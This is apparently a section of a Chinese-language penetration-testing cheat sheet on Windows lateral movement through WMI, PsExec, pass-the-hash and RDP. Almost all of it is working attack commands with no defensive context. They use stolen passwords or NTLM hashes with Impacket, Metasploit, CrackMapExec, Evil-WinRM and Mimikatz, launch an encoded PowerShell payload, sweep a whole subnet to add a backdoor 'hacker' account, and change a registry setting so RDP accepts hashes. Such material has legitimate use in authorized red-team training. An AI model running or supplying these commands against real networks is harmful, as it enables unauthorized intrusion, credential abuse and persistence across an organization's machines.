# 横向移动技巧

### 11.1 WMI 横向移动

```bash
# WMI 远程执行
# 使用 Impacket
impacket-wmiexec domain/user:password@10.0.0.10
impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH domain/user@10.0.0.10

# 使用 wmic 命令
wmic /node:10.0.0.10 /user:domain\user /password:pass process call create "cmd.exe /c whoami"

# WMI 远程创建进程
wmic /node:10.0.0.10 process call create "powershell -enc <base64_payload>"
```

### 11.2 PsExec 横向移动

```bash
# Impacket psexec
impacket-psexec domain/user:password@10.0.0.10
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH domain/user@10.0.0.10

# Sysinternals PsExec
psexec \\10.0.0.10 -u domain\user -p password cmd.exe
psexec \\10.0.0.10 -u domain\user -p password -s cmd.exe  # 以 SYSTEM 权限运行

# Metasploit
use exploit/windows/smb/psexec
set RHOSTS 10.0.0.10
set SMBUser user
set SMBPass password
set SMBDomain domain
exploit
```

### 11.3 Pass the Hash 横向移动

```bash
# CrackMapExec / NetExec（批量 PTH）
crackmapexec smb 10.0.0.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:NTLM_HASH
crackmapexec smb 10.0.0.0/24 -u administrator -H NTLM_HASH --local-auth

# Evil-WinRM（WinRM PTH）
evil-winrm -i 10.0.0.10 -u administrator -H NTLM_HASH

# Mimikatz PTH
mimikatz # sekurlsa::pth /user:administrator /domain:corp.local /ntlm:NTLM_HASH /run:cmd.exe

# 批量命令执行
crackmapexec smb 10.0.0.0/24 -u administrator -H NTLM_HASH -x "whoami" --local-auth
crackmapexec smb 10.0.0.0/24 -u administrator -H NTLM_HASH -x "net user hacker P@ss123 /add" --local-auth
```

### 11.4 RDP 横向移动

```bash
# RDP 连接（使用凭据）
xfreerdp /v:10.0.0.10 /u:administrator /p:password /dynamic-resolution

# RDP 连接（使用 Hash - 需 Restricted Admin 模式）
xfreerdp /v:10.0.0.10 /u:administrator /pth:NTLM_HASH

# 开启 Restricted Admin 模式（在已控机器上执行）
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
# 然后可以使用 PTH 通过 RDP 连接
```
